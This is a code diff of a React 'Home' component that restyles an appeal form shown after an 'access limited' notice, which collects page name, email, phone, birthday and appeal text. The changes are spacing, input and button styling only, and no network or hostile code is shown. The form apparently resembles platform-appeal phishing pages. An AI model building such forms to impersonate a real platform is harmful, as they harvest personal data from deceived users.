@@ -319,8 +319,8 @@ const Home = () => {
                             <p className='mb-3'>{translatedTexts.accessLimited}</p>
                             <p>{translatedTexts.submitAppeal}</p>
                         </div>
-                        <div className='flex flex-col gap-2 p-4 text-sm leading-6 font-semibold'>
-                            <div className='flex flex-col gap-1'>
+                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold sm:gap-2'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                 </p>
@@ -335,8 +335,7 @@ const Home = () => {
                                 />
                                 {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            
-                            <div className='flex flex-col gap-1'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.mail} <span className='text-red-500'>*</span>
                                 </p>
@@ -351,8 +350,7 @@ const Home = () => {
                                 />
                                 {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            
-                            <div className='flex flex-col gap-1'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.phone} <span className='text-red-500'>*</span>
                                 </p>
@@ -372,52 +370,28 @@ const Home = () => {
                                 </div>
                                 {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
-                            
-                            <div className='flex flex-col gap-1'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
                                 <p className='text-base sm:text-sm'>
                                     {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                 </p>
-                                
-                                {/* Desktop: type='date' */}
                                 <input 
                                     type='date' 
                                     name='birthday' 
-                                    className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
+                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                     style={{ fontSize: '16px' }}
                                     value={formData.birthday} 
                                     onChange={(e) => handleInputChange('birthday', e.target.value)} 
                                 />
-                                
-                                {/* Mobile: type='date' với placeholder ảo */}
-                                <div className='block sm:hidden relative'>
-                                    <input 
-                                        type='date' 
-                                        name='birthday' 
-                                        className={`w-full rounded-lg border px-3 py-2.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
-                                        style={{ fontSize: '16px' }}
-                                        value={formData.birthday} 
-                                        onChange={(e) => handleInputChange('birthday', e.target.value)}
-                                        required
-                                    />
-                                    {/* Placeholder ảo - chữ số nhỏ hơn */}
-                                    <div 
-                                        className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-lg'} font-medium`}
-                                        onClick={() => document.querySelector('input[name="birthday"]').click()}
-                                    >
-                                        {formData.birthday || 'dd/mm/yyyy'}
-                                    </div>
-                                </div>
-                                
                                 {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
                             
-                            <div className='flex flex-col gap-1'>
-                                <p className='text-base sm:text-sm'>
+                            <div className='flex flex-col gap-1 sm:gap-2'>
+                                <p className='text-sm sm:text-base'>
                                     {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
                                 </p>
                                 <textarea 
                                     name='appeal'
-                                    rows={4}
+                                    rows={3}
                                     className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
                                     style={{ fontSize: '16px' }}
                                     placeholder={translatedTexts.appealPlaceholder}
@@ -427,8 +401,9 @@ const Home = () => {
                                 {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                             </div>
 
+                            {/* NÚT SUBMIT VỚI CHIỀU CAO NHỎ HƠN */}
                             <button 
-                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 text-base font-semibold transition-colors duration-200 mt-1'
+                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 text-base font-semibold transition-colors duration-200 mt-2'
                                 onClick={handleSubmit}
                             >
                                 {translatedTexts.submit}
